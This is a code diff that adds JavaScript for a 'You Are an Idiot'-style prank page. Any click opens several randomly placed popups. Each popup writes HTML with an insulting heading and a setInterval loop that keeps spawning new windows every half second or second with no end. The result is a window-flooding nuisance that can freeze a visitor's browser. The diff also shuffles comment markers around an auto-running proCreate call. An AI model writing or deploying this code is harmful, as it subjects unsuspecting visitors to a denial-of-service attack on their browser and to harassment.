@@ -1,4 +1,97 @@
-function openWindow(url) {
+// Function to open tabs based on window type
+function openTabs(windowType) {
+    const tabCount = windowType === "main" ? 5 : 2;  // Determine how many tabs to open
+    const message = windowType === "main" ? "Opening 5 tabs..." : "Opening 2 tabs...";
+
+    alert(message); // Show user feedback
+
+    // Open the specified number of windows
+    for (let i = 0; i < tabCount; i++) {
+        openWindow(windowType);
+    }
+}
+
+// Function to open a new window
+function openWindow(windowType) {
+    // Use different content based on window type
+    const url = windowType === "main" ? "about:blank" : "about:blank"; // Can customize URL per type
+
+    const newWin = window.open(url, "_blank", "width=357,height=330");
+
+    if (newWin) {
+        const screenWidth = screen.width - 357;
+        const screenHeight = screen.height - 330;
+
+        const randomX = Math.floor(Math.random() * screenWidth);
+        const randomY = Math.floor(Math.random() * screenHeight);
+
+        newWin.moveTo(randomX, randomY);
+
+        // Inject different content based on window type
+        if (windowType === "main") {
+            newWin.document.write(`
+                <html>
+                <head><title>Main Window</title></head>
+                <body>
+                    <h1>Main Window - You Are an Idiot! 😂</h1>
+                    <script>
+                        setInterval(() => { window.open("about:blank", "_blank"); }, 500); // Fast tab spawning
+                    </script>
+                </body>
+                </html>
+            `);
+        } else {
+            newWin.document.write(`
+                <html>
+                <head><title>Popup Window</title></head>
+                <body>
+                    <h1>Popup Window - You Are a Popup! 😜</h1>
+                    <script>
+                        setInterval(() => { window.open("about:blank", "_blank"); }, 1000); // Slower tab spawning
+                    </script>
+                </body>
+                </html>
+            `);
+        }
+
+        newWin.document.close(); // Finalize the document
+    }
+}
+
+// Trigger the opening of windows based on button click or any other event
+document.addEventListener('click', function() {
+    const isMainWindow = window.location.search.includes('windowType=main');
+    openTabs(isMainWindow ? "main" : "popup");
+});
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+/*function openWindow(url) {
     var newWin = window.open("", "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
 
     // Move the new window to a random location once
@@ -126,7 +219,7 @@ window.onload = requestPopUpPermission;
 
 
 // Self-executing function to start immediately
-/*(function () {
+(function () {
         proCreate();
 })();
 */
